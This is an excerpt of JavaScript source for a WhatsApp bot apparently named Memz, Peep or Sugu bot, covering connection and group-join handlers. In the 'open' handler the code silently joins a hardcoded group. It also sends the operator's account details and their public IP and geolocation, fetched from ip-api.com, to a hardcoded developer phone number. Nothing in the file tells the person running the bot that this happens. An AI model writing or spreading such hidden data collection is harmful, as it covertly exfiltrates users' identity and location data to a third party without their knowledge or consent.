...
prefix = '#'
shp = '⬡'
owner = "919605243185@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Myslef M6828", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    console.log(
      ...
      client.sendMessage(`9605243185@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    success("2", "Successfully connected to wa, M6858");
console.log(color(figlet.textSync(`${spc1}            PEEP BOT`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('[DOGE BOT]'), color('Memz bot 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 teks = `https://chat.whatsapp.com/KpNd9T0CRL77PZVZL4q3bz`
 client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
 client.sendMessage(`919605243185@s.whatsapp.net`, `*Hi Owner memz, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Memz Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Memz.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("919605243185@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Memz Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Memz.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
...
fkontakk = { key: {
 ...
 message: {
    "contactMessage":{"displayName":'DEV',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Memz;;;\nFN:resku\nitem1.TEL;waid=919605243185:+91-960-524-3185\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
  ...
  client.on("group-participants-update", async (anu) => {
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hello everyone, am SUGU BOT, ready to help you here ㋛︎", "conversation");
      }
